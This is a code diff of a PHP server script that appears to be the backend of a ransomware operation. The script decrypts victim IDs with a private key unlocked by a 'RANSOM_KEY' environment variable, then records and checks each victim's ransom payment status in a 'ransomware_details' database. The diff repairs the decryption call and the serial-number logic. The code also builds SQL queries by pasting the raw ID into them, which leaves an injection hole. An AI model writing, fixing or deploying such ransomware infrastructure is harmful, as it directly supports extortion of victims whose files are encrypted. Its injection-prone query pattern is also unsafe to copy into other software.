@@ -1,6 +1,6 @@
 <?php
 include('update_db.php');
-$GLOBALS['sr'] = 1;
+$GLOBALS['sr'] = 0;
 
 function Connection(){
 	//Configuration of database
@@ -47,11 +47,10 @@ function hide(){
 
 function returnDecrypted($dbconn,$key,$id){
 	$private_key = file_get_contents("private.pem");
-    	$res = openssl_get_privatekey($private_key,getenv('RANSOM_KEY'));
-    	openssl_private_decrypt(base64_decode($id),$dec,$id);
-    	$id = $dec;
-	echo "$id";
-
+    $res = openssl_get_privatekey($private_key,getenv('RANSOM_KEY'));
+    $tmp = str_replace('-','+',$id);
+    openssl_private_decrypt(base64_decode($tmp),$dec,$res);
+    $id = $dec;
 	$query = "SELECT payment_status from ransomware_details where id='$id';";
 	$result = pg_query($dbconn,$query);
 	$tmp = pg_fetch_row($result)[0];
@@ -104,8 +103,9 @@ if(checkValidity()){
 	$id = pg_fetch_row($result)[0];
 	$id = $id+1;
 
-	$sno = $GLOBALS['sr'];
+	$GLOBALS['sr'] = $sr_no;
 	$GLOBALS['sr']=$GLOBALS['sr']+1;
+	$sno = $GLOBALS['sr'];
 	$query = "INSERT INTO ransomware_details (sr,id,payment_status) VALUES "."('$sno', '$id','No');";
 	$result = pg_query($dbconn,$query);
 	//echo $result;
@@ -115,7 +115,6 @@ if(checkValidity()){
 		exit;
 	}
 	else{
-	//Finally send the public key after all checks
 		echo "$id";
 		pg_close();
 	}
